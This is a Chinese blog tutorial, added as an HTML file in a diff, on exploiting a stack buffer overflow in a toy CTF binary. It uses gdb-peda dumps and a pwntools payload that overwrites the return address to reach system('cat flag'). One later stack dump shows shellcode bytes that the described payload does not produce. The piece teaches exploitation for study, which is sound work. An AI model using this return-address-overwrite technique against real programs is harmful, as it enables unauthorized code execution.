@@ -1,0 +1,402 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta http-equiv="content-language" content="zh-cn">
+    <title>二进制安全之栈溢出（二） - virusdefender's blog (＾－＾)V</title>
+    <link rel="shortcut icon" href="/assets/img/favicon.ico">
+    <meta name="author"  content="virusdefender">
+    <meta name="description" content=" 学而不思则罔，思而不学则殆">
+    <meta name="keywords"  content="virusdefender,blog">
+    <!-- Open Graph -->
+    <meta property="og:title" content="二进制安全之栈溢出（二） - virusdefender's blog (＾－＾)V">
+    <meta property="og:type" content="website">
+    <meta property="og:url" content="https://strcpy.me/index.php/archives/777/">
+    <meta property="og:description" content=" 学而不思则罔，思而不学则殆">
+    <meta property="og:site_name" content="virusdefender's blog (＾－＾)V">
+    <link rel="stylesheet" href="//cdn.staticfile.org/normalize/6.0.0/normalize.min.css">
+    <link rel="stylesheet" href="//at.alicdn.com/t/font_roc50gemkxpw4s4i.css">
+    <link rel="stylesheet" href="/assets/css/github-markdown.css">
+    <link rel="stylesheet" href="/assets/css/prism.css">
+    <link rel="stylesheet" href="/assets/css/app.min.css">
+    <link rel="alternate" type="application/rss+xml" title="RSS 2.0" href="https://strcpy.me/feed/" />
+</head>
+
+<body>
+    <!--[if lt IE 10]>
+<div class="alert-danger" role="alert">你的浏览器实在太太太旧了，放学别走，升级完浏览器再说！<a target="_blank" class="alert-link" href="http://browsehappy.com">立即升级</a></div>
+<![endif]-->
+    <header class="g-header">
+    <div class="g-logo">
+        <a href="/">virusdefender's blog (＾－＾)V</a>
+    </div>
+    <i id="menu-toggle" class="iconfont icon-menu"></i>
+    <nav class="g-nav">
+        <ul>
+            
+            <li><a href="/">home</a></li>
+            
+            <li><a href="http://www.npc.gov.cn/npc/xinwen/2016-11/07/content_2001605.htm">law</a></li>
+            
+            <li><a href="/index.php/archives/about/">about</a></li>
+            
+        </ul>
+    </nav>
+</header>
+
+
+<header class="g-banner post-header post-pattern-circuitBoard bgcolor-default post-no-cover" data-theme="default">
+    <div class="post-wrapper">
+        <div class="post-tags">
+             
+            
+            <a href="/tags/#安全" class="post-tag">安全</a>
+            
+            <a href="/tags/#CTF" class="post-tag">CTF</a>
+            
+            
+        </div>
+        <h1>二进制安全之栈溢出（二）</h1>
+        <div class="post-meta">
+            <time class="post-meta-item" datetime="2017-10-21 12:46"><i class="iconfont icon-date"></i>2017-10-21 12:46</time>
+        </div>
+    </div>
+</header>
+
+<div class="post-content">
+    
+    <article class="markdown-body">
+        <p><a href="https://virusdefender.net/index.php/archives/776/">上一篇文章</a>是通过数组越界覆盖结构体中其他成员内存，达到修改该成员的值的目的，接下来将使用第二种方法获取 flag，就是使用数组越界覆盖函数的返回地址，达到控制函数执行流程的目的。</p>
+
+<h2 id="函数栈的变化">函数栈的变化</h2>
+
+<p>这一次需要使用的编译参数是 <code class="highlighter-rouge">gcc -g -O0 -fno-stack-protector -o vuln main.c</code>，<code class="highlighter-rouge">fno-stack-protector</code> 是禁用编译器的栈保护机制，毕竟是入门。需要提前学习的是 <a href="https://zhuanlan.zhihu.com/p/25816426">https://zhuanlan.zhihu.com/p/25816426</a> 里面的背景知识，明白函数调用过程中栈的变化。</p>
+
+<p>总结一下</p>
+
+<ul>
+  <li>
+    <p>调用其他函数：</p>
+
+    <ul>
+      <li>参数进栈（当然后面会发现，x64 下面会优先使用寄存器传参数的）</li>
+      <li>下一条指令地址进栈</li>
+    </ul>
+  </li>
+  <li>
+    <p>进入函数：</p>
+
+    <ul>
+      <li>当前栈基地址压栈（当前栈基地址实际上也是前一个函数的栈基地址）</li>
+    </ul>
+  </li>
+</ul>
+
+<p>比如代码</p>
+
+<pre><code class="language-clike">int add(int a, int b){
+    return a + b;
+}
+
+int main(){
+    int a = 1;
+    int b = 2;
+    add(a, b);
+    return 0;
+}
+</code></pre>
+
+<p>得到的汇编是这样的</p>
+
+<div class="highlighter-rouge"><pre class="highlight"><code>gdb-peda$ pdisas main
+Dump of assembler code for function main:
+   0x00000000004004ea &lt;+0&gt;:	push   rbp
+   0x00000000004004eb &lt;+1&gt;:	mov    rbp,rsp
+   # 栈顶提高 16 个字节  |rbp|........|rsp| -&gt; 内存地址减小方向
+   0x00000000004004ee &lt;+4&gt;:	sub    rsp,0x10
+   # 在栈上放了两个数字，占用了 8 个字节
+   # |rbp| 2 | 1 | ... |rsp|
+   0x00000000004004f2 &lt;+8&gt;:	mov    DWORD PTR [rbp-0x8],0x1
+   0x00000000004004f9 &lt;+15&gt;:	mov    DWORD PTR [rbp-0x4],0x2
+   # 把两个数字给寄存器
+   0x0000000000400500 &lt;+22&gt;:	mov    edx,DWORD PTR [rbp-0x4]
+   0x0000000000400503 &lt;+25&gt;:	mov    eax,DWORD PTR [rbp-0x8]
+   0x0000000000400506 &lt;+28&gt;:	mov    esi,edx
+   0x0000000000400508 &lt;+30&gt;:	mov    edi,eax
+   # 函数调用，其实相当于 push 下一条指令地址，然后跳转到 add 函数那里
+   0x000000000040050a &lt;+32&gt;:	call   0x4004d6 &lt;add&gt;
+   # eax 在这里保存返回值的值
+   0x000000000040050f &lt;+37&gt;:	mov    eax,0x0
+   # leave 相当于 mov rsp,rbp; pop rbp
+   # 这个函数的栈相当于清空了
+   0x0000000000400514 &lt;+42&gt;:	leave
+   0x0000000000400515 &lt;+43&gt;:	ret
+End of assembler dump.
+
+gdb-peda$ pdisas add
+Dump of assembler code for function add:
+   # 保存 main 函数的栈底地址
+   0x00000000004004d6 &lt;+0&gt;:	push   rbp
+   # rbp = rsp 当前函数的栈底地址等于栈顶地址，相当于创建了一个新的空栈
+   0x00000000004004d7 &lt;+1&gt;:	mov    rbp,rsp
+   # 寄存器中的值放到栈里面，然后放到运算的寄存器中
+   0x00000000004004da &lt;+4&gt;:	mov    DWORD PTR [rbp-0x4],edi
+   0x00000000004004dd &lt;+7&gt;:	mov    DWORD PTR [rbp-0x8],esi
+   0x00000000004004e0 &lt;+10&gt;:	mov    edx,DWORD PTR [rbp-0x4]
+   0x00000000004004e3 &lt;+13&gt;:	mov    eax,DWORD PTR [rbp-0x8]
+   # 加法
+   0x00000000004004e6 &lt;+16&gt;:	add    eax,edx
+   # pop rbp，其实这个函数中栈里面并没有新增的数据
+   0x00000000004004e8 &lt;+18&gt;:	pop    rbp
+   0x00000000004004e9 &lt;+19&gt;:	ret
+End of assembler dump.
+</code></pre>
+</div>
+
+<p>使用上篇文章的代码生成的汇编会更复杂，但是暂时这些就够了。</p>
+
+<h2 id="使用-peda-查看栈和寄存器数据">使用 peda 查看栈和寄存器数据</h2>
+
+<p><code class="highlighter-rouge">gdb ./vuln</code> 然后 <code class="highlighter-rouge">b 21</code> 在 <code class="highlighter-rouge">gets(student.name);</code> 后面下断点，<code class="highlighter-rouge">r</code> 运行，输入 <code class="highlighter-rouge">1925</code> 和 <code class="highlighter-rouge">AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA</code> 之后可以看到 peda 的输出分为几部分，分为 <code class="highlighter-rouge">registers</code>、<code class="highlighter-rouge">code</code> 和 <code class="highlighter-rouge">stack</code>，分别是寄存器、汇编代码和栈数据分布。</p>
+
+<div class="highlighter-rouge"><pre class="highlight"><code>gdb-peda$ b 21
+Breakpoint 1 at 0x40072e: file main.c, line 21.
+gdb-peda$ r
+Starting program: /home/virusdefender/Desktop/pwn/new/vuln
+What's Your Birth?
+1925
+What's Your Name?
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+[----------------------------------registers-----------------------------------]
+RAX: 0x7fffffffe2f0 ('A' &lt;repeats 63 times&gt;)
+RBX: 0x0
+RCX: 0x7ffff7dd18e0 --&gt; 0xfbad2288
+RDX: 0x7ffff7dd3790 --&gt; 0x0
+RSI: 0x60245f --&gt; 0xa ('\n')
+RDI: 0x7fffffffe32f --&gt; 0x785ffffe46300
+RBP: 0x7fffffffe340 --&gt; 0x400790 (&lt;__libc_csu_init&gt;:	push   r15)
+RSP: 0x7fffffffe2e0 --&gt; 0x7fffffffe428 --&gt; 0x7fffffffe6b3 ("/home/virusdefender/Desktop/pwn/new/vuln")
+RIP: 0x40072e (&lt;main+120&gt;:	mov    eax,DWORD PTR [rbp-0xc])
+R8 : 0x602460 --&gt; 0x0
+R9 : 0x4141414141414141 ('AAAAAAAA')
+R10: 0x4141414141414141 ('AAAAAAAA')
+R11: 0x246
+R12: 0x4005c0 (&lt;_start&gt;:	xor    ebp,ebp)
+R13: 0x7fffffffe420 --&gt; 0x1
+R14: 0x0
+R15: 0x0
+EFLAGS: 0x246 (carry PARITY adjust ZERO sign trap INTERRUPT direction overflow)
+[-------------------------------------code-------------------------------------]
+   0x400721 &lt;main+107&gt;:	mov    rdi,rax
+   0x400724 &lt;main+110&gt;:	mov    eax,0x0
+   0x400729 &lt;main+115&gt;:	call   0x400590 &lt;gets@plt&gt;
+=&gt; 0x40072e &lt;main+120&gt;:	mov    eax,DWORD PTR [rbp-0xc]
+   0x400731 &lt;main+123&gt;:	mov    esi,eax
+   0x400733 &lt;main+125&gt;:	mov    edi,0x400855
+   0x400738 &lt;main+130&gt;:	mov    eax,0x0
+   0x40073d &lt;main+135&gt;:	call   0x400560 &lt;printf@plt&gt;
+[------------------------------------stack-------------------------------------]
+0000| 0x7fffffffe2e0 --&gt; 0x7fffffffe428 --&gt; 0x7fffffffe6b3 ("/home/virusdefender/Desktop/pwn/new/vuln")
+0008| 0x7fffffffe2e8 --&gt; 0x1ff000000
+0016| 0x7fffffffe2f0 ('A' &lt;repeats 63 times&gt;)
+0024| 0x7fffffffe2f8 ('A' &lt;repeats 55 times&gt;)
+0032| 0x7fffffffe300 ('A' &lt;repeats 47 times&gt;)
+0040| 0x7fffffffe308 ('A' &lt;repeats 39 times&gt;)
+0048| 0x7fffffffe310 ('A' &lt;repeats 31 times&gt;)
+0056| 0x7fffffffe318 ('A' &lt;repeats 23 times&gt;)
+[------------------------------------------------------------------------------]
+Legend: code, data, rodata, value
+
+Breakpoint 1, main (argc=0x1, argv=0x7fffffffe428) at main.c:21
+21	    printf("You Are Born In %d\n", student.birth);
+
+gdb-peda$ p &amp;student
+$1 = (struct Student *) 0x7fffffffe2f0
+gdb-peda$ p sizeof(student)
+$2 = 0x48
+</code></pre>
+</div>
+
+<p>register 中可以看到 <code class="highlighter-rouge">RBP: 0x7fffffffe340</code>、<code class="highlighter-rouge">RSP: 0x7fffffffe2e0</code> 和 <code class="highlighter-rouge">RIP: 0x40072e</code>，在 stack 中可以看到这两个地址之间的数据，当然空间原因显示的并不全，可以使用 <code class="highlighter-rouge">telescope 16</code> 查看更多的栈内存。</p>
+
+<div class="highlighter-rouge"><pre class="highlight"><code>gdb-peda$ p $rbp
+$6 = (void *) 0x7fffffffe340
+gdb-peda$ p $rsp
+$7 = (void *) 0x7fffffffe2e0
+gdb-peda$ telescope 16
+0000| 0x7fffffffe2e0 --&gt; 0x7fffffffe428 --&gt; 0x7fffffffe6b3 ("/home/virusdefender/Desktop/pwn/new/vuln")
+0008| 0x7fffffffe2e8 --&gt; 0x1ff000000
+0016| 0x7fffffffe2f0 ('A' &lt;repeats 63 times&gt;)
+0024| 0x7fffffffe2f8 ('A' &lt;repeats 55 times&gt;)
+0032| 0x7fffffffe300 ('A' &lt;repeats 47 times&gt;)
+0040| 0x7fffffffe308 ('A' &lt;repeats 39 times&gt;)
+0048| 0x7fffffffe310 ('A' &lt;repeats 31 times&gt;)
+0056| 0x7fffffffe318 ('A' &lt;repeats 23 times&gt;)
+0064| 0x7fffffffe320 ('A' &lt;repeats 15 times&gt;)
+0072| 0x7fffffffe328 --&gt; 0x41414141414141 ('AAAAAAA')
+0080| 0x7fffffffe330 --&gt; 0x785ffffe463
+0088| 0x7fffffffe338 --&gt; 0x0
+0096| 0x7fffffffe340 --&gt; 0x400790 (&lt;__libc_csu_init&gt;:	push   r15)
+0104| 0x7fffffffe348 --&gt; 0x7ffff7a2d830 (&lt;__libc_start_main+240&gt;:	mov    edi,eax)
+0112| 0x7fffffffe350 --&gt; 0x0
+0120| 0x7fffffffe358 --&gt; 0x7fffffffe428 --&gt; 0x7fffffffe6b3 ("/home/virusdefender/Desktop/pwn/new/vuln")
+</code></pre>
+</div>
+
+<p>然后可以简单得到 <code class="highlighter-rouge">student</code> 的内存的范围，<code class="highlighter-rouge">0x7fffffffe2f0 - 0x7fffffffe338</code> 就是在栈中。<code class="highlighter-rouge">0032| 0x7fffffffe340 --&gt; 0x400790 (&lt;__libc_csu_init&gt;:	push   r15)</code> 也印证了这一点，这样 <code class="highlighter-rouge">0x7fffffffe340</code> 地址的数据就很明显是 main 函数的 rbp，<code class="highlighter-rouge">0x7fffffffe348</code> 的数据就是 main 函数的下一句指令的地址。</p>
+
+<h2 id="控制函数流程">控制函数流程</h2>
+
+<p>只要把 <code class="highlighter-rouge">system("cat flag");</code> 的地址写入到 <code class="highlighter-rouge">0x7fffffffe348</code> 就可以了，这个地址可以从 <code class="highlighter-rouge">pdisas main</code> 汇编代码中看到</p>
+
+<div class="highlighter-rouge"><pre class="highlight"><code>0x0000000000400756 &lt;+160&gt;:	mov    edi,0x40087e
+0x000000000040075b &lt;+165&gt;:	mov    eax,0x0
+0x0000000000400760 &lt;+170&gt;:	call   0x400550 &lt;system@plt&gt;
+</code></pre>
+</div>
+
+<p>而 <code class="highlighter-rouge">0x40087e</code> 处就是 <code class="highlighter-rouge">system</code> 的参数</p>
+
+<div class="highlighter-rouge"><pre class="highlight"><code>gdb-peda$ x 0x40087e
+0x40087e:	"cat flag"
+</code></pre>
+</div>
+
+<p>所以要覆盖成的指令地址就是 <code class="highlighter-rouge">0x0000000000400756</code>，而不能是 <code class="highlighter-rouge">0x0000000000400760</code>，否则函数取到的参数可能是错误的。</p>
+
+<p>思考：这个地址是在内存哪个区域？是栈区么？这个地址会变么？</p>
+
+<p>payload 是</p>
+
+<div class="language-python highlighter-rouge"><pre class="highlight"><code><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
+<span class="k">print</span> <span class="s">"1925</span><span class="se">\n</span><span class="s">"</span> <span class="o">+</span> <span class="s">"A"</span> <span class="o">*</span> <span class="p">(</span><span class="mh">0x7fffffffe348</span> <span class="o">-</span> <span class="mh">0x7fffffffe2f0</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x0000000000400756</span><span class="p">)</span>
+</code></pre>
+</div>
+
+<p>这里使用了 pwntools 库，p64 函数的作用就是把一个数字转换为内存中分布的形式</p>
+
+<div class="language-python highlighter-rouge"><pre class="highlight"><code><span class="o">&gt;&gt;&gt;</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0xdeadbeef</span><span class="p">)</span>
+<span class="s">'</span><span class="se">\xef\xbe\xad\xde\x00\x00\x00\x00</span><span class="s">'</span>
+</code></pre>
+</div>
+
+<div class="highlighter-rouge"><pre class="highlight"><code>What's Your Birth?
+What's Your Name?
+You Are Born In 1094795585
+You Are Naive.
+You Speed One Second Here.
+THIS_IS_FLAG
+[1]    78848 bus error (core dumped)  ./vuln &lt; 1.in
+</code></pre>
+</div>
+
+<p>运行后虽然能成功的打印出 flag，但是最后进程会 crash，是因为 main 函数的栈底地址被我们覆盖了，如果要避免崩溃，还是需要精细的维护堆栈平衡的。</p>
+
+<p>使用 GDB <code class="highlighter-rouge">b 29</code>，也就是最后的 <code class="highlighter-rouge">return 0</code></p>
+
+<div class="highlighter-rouge"><pre class="highlight"><code>gdb-peda$ b 29
+Breakpoint 1 at 0x40077b: file main.c, line 29.
+gdb-peda$ r &lt; 1.in
+Starting program: /home/virusdefender/Desktop/pwn/new/vuln &lt; 1.in
+What's Your Birth?
+What's Your Name?
+You Are Born In 1094795585
+You Are Naive.
+You Speed One Second Here.
+[----------------------------------registers-----------------------------------]
+RAX: 0x1b
+RBX: 0x0
+RCX: 0x7ffff7b04290 (&lt;__write_nocancel+7&gt;:	cmp    rax,0xfffffffffffff001)
+RDX: 0x7ffff7dd3780 --&gt; 0x0
+RSI: 0x602010 ("You Speed One Second Here.\n")
+RDI: 0x1
+RBP: 0x7fffffffe340 ("AAAAAAAA\360\342\377\377\377\177")
+RSP: 0x7fffffffe2e0 --&gt; 0x7fffffffe428 --&gt; 0x7fffffffe6b6 ("/home/virusdefender/Desktop/pwn/new/vuln")
+RIP: 0x40077b (&lt;main+197&gt;:	mov    eax,0x0)
+R8 : 0x2e6572654820646e ('nd Here.')
+R9 : 0x1b
+R10: 0x0
+R11: 0x246
+R12: 0x4005c0 (&lt;_start&gt;:	xor    ebp,ebp)
+R13: 0x7fffffffe420 --&gt; 0x1
+R14: 0x0
+R15: 0x0
+EFLAGS: 0x246 (carry PARITY adjust ZERO sign trap INTERRUPT direction overflow)
+[-------------------------------------code-------------------------------------]
+   0x40076c &lt;main+182&gt;:	call   0x400540 &lt;puts@plt&gt;
+   0x400771 &lt;main+187&gt;:	mov    edi,0x400896
+   0x400776 &lt;main+192&gt;:	call   0x400540 &lt;puts@plt&gt;
+=&gt; 0x40077b &lt;main+197&gt;:	mov    eax,0x0
+   0x400780 &lt;main+202&gt;:	leave
+   0x400781 &lt;main+203&gt;:	ret
+   0x400782:	nop    WORD PTR cs:[rax+rax*1+0x0]
+   0x40078c:	nop    DWORD PTR [rax+0x0]
+[------------------------------------stack-------------------------------------]
+0000| 0x7fffffffe2e0 --&gt; 0x7fffffffe428 --&gt; 0x7fffffffe6b6 ("/home/virusdefender/Desktop/pwn/new/vuln")
+0008| 0x7fffffffe2e8 --&gt; 0x1ff000000
+0016| 0x7fffffffe2f0 --&gt; 0x6e69622fbb48f631
+0024| 0x7fffffffe2f8 ("//shVST_j;X1\322\017\005", 'A' &lt;repeats 65 times&gt;, "\360\342\377\377\377\177")
+0032| 0x7fffffffe300 --&gt; 0x41050fd231583b6a
+0040| 0x7fffffffe308 ('A' &lt;repeats 64 times&gt;, "\360\342\377\377\377\177")
+0048| 0x7fffffffe310 ('A' &lt;repeats 56 times&gt;, "\360\342\377\377\377\177")
+0056| 0x7fffffffe318 ('A' &lt;repeats 48 times&gt;, "\360\342\377\377\377\177")
+[------------------------------------------------------------------------------]
+Legend: code, data, rodata, value
+
+Breakpoint 1, main (argc=0x1, argv=0x7fffffffe428) at main.c:29
+29	    return 0;
+</code></pre>
+</div>
+
+<p>然后输入 <code class="highlighter-rouge">ni</code> 一直回车，注意观察 <code class="highlighter-rouge">code</code> 区域，就可以进行汇编指令级别的单步调试。</p>
+
+<p>思考题答案：</p>
+
+<ul>
+  <li>内存会分为很多块区域，比如数据段、代码段等，二进制文件中的指令是存储在代码段的</li>
+  <li>一般情况下代码段的地址就是确定的，即使开启了 ASLR，更详细的后面会说到。</li>
+</ul>
+
+<h2 id="参考">参考</h2>
+
+<ul>
+  <li><a href="http://www.csyssec.org/20170508/intro-aslr/">http://www.csyssec.org/20170508/intro-aslr/</a></li>
+  <li><a href="https://pinglinblog.wordpress.com/2016/10/18/linux-%E7%A8%8B%E5%BA%8F%E7%9A%84-memory-layout-%E5%88%9D%E6%B7%BA%E8%AA%8D%E8%AD%98/">https://pinglinblog.wordpress.com/2016/10/18/linux-%E7%A8%8B%E5%BA%8F%E7%9A%84-memory-layout-%E5%88%9D%E6%B7%BA%E8%AA%8D%E8%AD%98/</a></li>
+  <li>x86_64 汇编学习系列文章 <a href="https://0xax.github.io/asm_1/">https://0xax.github.io/asm_1/</a> - <a href="https://0xax.github.io/asm_8/">https://0xax.github.io/asm_8/</a></li>
+</ul>
+
+
+
+        <section class="author-detail">
+            <section class="post-footer-item comment">
+                <a href="/comment.html?title=二进制安全之栈溢出（二）&article_id=/index.php/archives/777/" target="_blank">评论</a> | <a href="#" onclick="document.getElementById('wx-pay').style.display = ''; return false;">微信打赏</a> | 转载必须注明原文链接
+            </section>
+            <img src="https://storage.virusdefender.net/blog/images/utils/wx_pay_new.JPG" style="max-width: 90%;max-height: 90%; display: none;" id="wx-pay">
+        </section>
+    </article>
+</div>
+
+
+<script>
+var _hmt = _hmt || [];
+(function() {
+  var hm = document.createElement("script");
+  hm.src = "https://hm.baidu.com/hm.js?e5ec0a55646c7c7c90dc530c56c80171";
+  var s = document.getElementsByTagName("script")[0]; 
+  s.parentNode.insertBefore(hm, s);
+})();
+</script>
+
+
+<footer class="g-footer">
+    <section>virusdefender's blog (＾－＾)V © 2019</section>
+    <section>Powered by <a href="//jekyllrb.com">Jekyll</a> | <a href="https://github.com/kaeyleo/jekyll-theme-H2O">Theme H2O</a></section>
+</footer>
+
+
+    <script src="https://cdn.staticfile.org/jquery/3.2.1/jquery.min.js"></script>
+    <script src="/assets/js/prism.js"></script>
+    <script src="/assets/js/index.min.js"></script>
+</body>
+</html>
